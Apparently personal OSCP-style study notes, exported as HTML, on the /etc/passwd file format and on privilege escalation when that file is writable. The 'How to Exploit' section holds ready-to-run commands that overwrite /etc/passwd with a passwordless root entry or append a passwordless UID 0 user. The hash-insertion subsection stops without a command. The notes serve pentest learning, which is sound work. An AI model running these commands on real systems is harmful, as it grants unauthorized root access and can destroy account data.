<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>/etc/passwd</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># /etc/passwd</h1></strong><br /><a href="https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file">https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file</a><br /><br />If <code>/etc/passwd</code> you&#39;ve probably hit the jackpot.<br /><br /><strong>Examples</strong><br />• oscp 10.11.1.39 - leftturn.thinc<br /><br /><strong><h2>## About /etc/passwd</h2></strong><br /><code>/etc/passwd</code> multiple fields separate by a colon.<br /><br /><code>root:x:0:0:root:/root:/bin/bash</code><br /><code>1:2:3:4:5:6:7</code><br /><code>username : password : UID : GID : comments : home directory : default shell</code><br /><br /><strong>Fields</strong><br />1. Username<br />2. User&#39;s password <br />   ◇ <code>x</code> that means the password is stored in the /etc/shadow file<br />   ◇ <code>*</code> means the user doesn&#39;t have login access <br />   ◇ blank means the user doesn&#39;t have a password<br />3. The user ID<br />4. The group ID<br />5. GECOS field<br />   ◇ Generally used to leave comments about the user or account, such as their real name or phone number<br />   ◇ comma delimited<br />6. User&#39;s home directory<br />7. User&#39;s default login shell<br /><br /><strong><h2>## How to Exploit</h2></strong><br /><a href="https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file">https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file</a><br /><br /><strong><h3>### Remove root password</h3></strong><br />• Remove the <code>x</code> from root so that root doens&#39;t have a password anymore<br /><br /><code>echo root::0:0:root:/root:/bin/bash &gt; /etc/passwd</code><br /><code>su</code><br /><br />A less destructive way of doing this would be to take the existing /etc/passwd, edit just the line you want, and write it back in<br /><br /><strong><h3>### Create another user</h3></strong><br />• Create another user with UID and GID of <code>0</code> and no password and log in as them<br />   ◇ This is good if you can only append to the /etc/passwd<br /><br /><code>echo &quot;john::0:0:john:/home/john:/bin/bash&quot; &gt;&gt; /etc/passwd</code><br /><code>su john</code><br />Remove the added line when finished with <code>sed -i &#39;$ d&#39; /etc/passwd</code><br /><br /><strong><h3>### Insert password hash</h3></strong><br />• If passwordless accounts are disabled, put in a hash of a password of your choice for the user<br />   ◇ Passwords used to be stored in /etc/passwd<br />   ◇ For backwards compatibility, if a password hash is present in /etc/passwd, it takes precedence over /etc/shadow<br /><br /><strong><br /></strong></div>
</body>
</html>
